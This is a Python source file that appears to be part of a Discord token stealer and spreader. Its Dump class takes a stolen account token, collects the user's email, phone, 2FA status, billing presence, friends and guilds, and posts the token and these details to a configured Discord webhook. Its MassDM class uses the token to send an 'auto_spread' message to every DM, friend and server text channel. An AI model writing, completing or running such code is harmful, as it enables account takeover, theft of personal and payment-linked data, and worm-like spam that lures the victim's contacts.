from time import time
from urllib import request
import requests
import json
from discord_webhook   import DiscordWebhook, DiscordEmbed
import time
from config import config
import asyncio

from colorama import Fore
from colorama import Style
from datetime import datetime

class Dump:
    def get_headers(self, token, content_type="application/json"):
        headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",      
    }
        if token:
            headers.update({"Authorization": token})
        return headers
    
    def get_details(self, token):
        data = requests.get('https://discordapp.com/api/v6/users/@me', headers=self.get_headers(token))
        return json.loads(data.text)
               
    def get_relationships(self, token):
        data = requests.get('https://discordapp.com/api/v6/users/@me/relationships', headers=self.get_headers(token))
        return len(json.loads(data.text))
    
    def get_guilds(self, token):
        data = requests.get("https://discordapp.com/api/v6/users/@me/guilds", headers=self.get_headers(token))

        return json.loads(data.text)
        
    def get_payment(self, token):
        data = requests.get("https://discordapp.com/api/users/@me/billing/payment-sources", headers=self.get_headers(token))
        #disord just returns an empty array if no billing
        data2 = len(json.loads(data.text))
        return bool(data2)


    

    
    
    def generate_embed(self, token):
        details = self.get_details(token)
        NITRO = False
        PHONE = details['phone']
        if not PHONE:
            PHONE = False
            
        if details["flags"]:
            NITRO = True
            
        guilds = self.get_guilds(token)
        numGuilds = 0
        for guild in guilds:
            if guild["owner"]:
                numGuilds += 1

        embed = DiscordEmbed()
        embed.set_author(name=f"{details['username']}#{details['discriminator']}:{details['id']}", icon_url=f"https://cdn.discordapp.com/avatars/{details['id']}/{details['avatar']}.webp?size=128")
        embed.add_embed_field(name='Token',         value=token, inline=False)
        embed.add_embed_field(name='Email',         value=details['email'], inline=False)
        embed.add_embed_field(name='Phone',         value=PHONE, inline=False)
        embed.add_embed_field(name='2FA',           value=details["mfa_enabled"])
        embed.add_embed_field(name='Nitro',         value=NITRO)
        embed.add_embed_field(name='Billing',       value=self.get_payment(token))
        embed.add_embed_field(name='Relationships', value=self.get_relationships(token))
        embed.add_embed_field(name='Guilds',        value=len(guilds))
        embed.add_embed_field(name='Owned Guilds',  value=numGuilds)
        return embed
    
    
    def send_webhook(self, token):
        webhook = DiscordWebhook(url=config["webhook_url"])
        
        webhook.add_embed(self.generate_embed(token))
        try:
            response = webhook.execute()
        except Exception:
            print('Failed to send webhook')
            
    def open_dm(self, token, recipient):
        payload = json.dumps({"recipients": [recipient]})
        
        data = requests.post("https://discord.com/api/v9/users/@me/channels", headers=self.get_headers, data=payload)
        return json.loads(data.text)['id']
    


class MassDM:
    async def init(self, token, name):
        self.token = token
        self.headers = await self.get_headers(token)
        self.name = name

    async def get_headers(self, token, content_type="application/json"):
        headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",      
            }
        if token:
            headers.update({"Authorization": token})
        return headers
    
    async def get_guilds(self):
        data = requests.get("https://discordapp.com/api/v6/users/@me/guilds", headers=self.headers)

        return (json.loads(data.text))
    
    async def get_guild_channels(self, guild_id):
        data = requests.get(f"https://discordapp.com/api/guilds/{guild_id}/channels", headers=self.headers)
        return (json.loads(data.text))

    async def get_dms(self):
        data = requests.get(f"https://discord.com/api/v8/users/@me/channels", headers=self.headers)
        return (json.loads(data.text))

    async def get_relationships(self):
        data = requests.get('https://discordapp.com/api/v6/users/@me/relationships', headers=self.headers)
        return json.loads(data.text)

    
    async def message_channel(self, channel_id):
        while True:
            body = {
                "content": config['auto_spread']['message']
            }
            req = requests.post(f'https://discordapp.com/api/channels/{channel_id}/messages', headers=self.headers, json=body)
            data = json.loads(req.text)
            print(data)
            if req.status_code == 401:
                break
        
            if req.status_code == 403:
                break

            if 'retry_after' in data:
                print(data['retry_after']/1000, " seconds")
                await asyncio.sleep(data['retry_after']/1000)


            if 'code' in data:
                if data['code'] == 50007:
                    break
            
            if 'Missing Access' in data:
                break
            
            if 'id' in data:
                break
                


    async def open_dm(self, recipient):
        payload = json.dumps({"recipients": [recipient]}) #[] because its an array just only 1 element, this endpoint designed to support multiple people
        
        data = requests.post("https://discord.com/api/users/@me/channels", headers=self.headers, data=payload)
        return json.loads(data.text)['id']
    
    async def close_dm(self, dm_id):
        data = requests.delete(f"https://discord.com/api/v8/channels/{dm_id}", headers=self.headers)

    async def message_friends(self):
        for relationship in await self.get_relationships():
            if relationship['type'] == 1:
                dm_id = await self.open_dm(relationship['id'])
                # dm_id = self.message_channel(dm_id)
                await self.close_dm(dm_id)
                print(f'{Fore.BLUE}[{datetime.now()}] [MassDM] [USER:{self.name}] [FRIEND:{relationship["user"]["username"]}#{relationship["user"]["discriminator"]}]')

            print('Done messaging friends')

    
    async def message_dms(self):
        for dm in await self.get_dms():
            await self.message_channel(dm['id'])
            await self.close_dm(dm['id'])
            print(f'{Fore.BLUE}[{datetime.now()}] [MassDM] [USER:{self.name}] [DM:{dm["recipients"]}]')

        print('Done messaging dms')


    async def message_guilds(self):
        for guild in await self.get_guilds():
            for channel in await self.get_guild_channels(guild['id']):
                if channel['type'] == 0:
                    await self.message_channel(channel['id'])
                    print(f'{Fore.BLUE}[{datetime.now()}] [MassDM] [USER:{self.name}] [GUILD:{guild["name"]}] [CHANNEL:{channel["name"]}]')

        print('Done messaging guilds')



    

        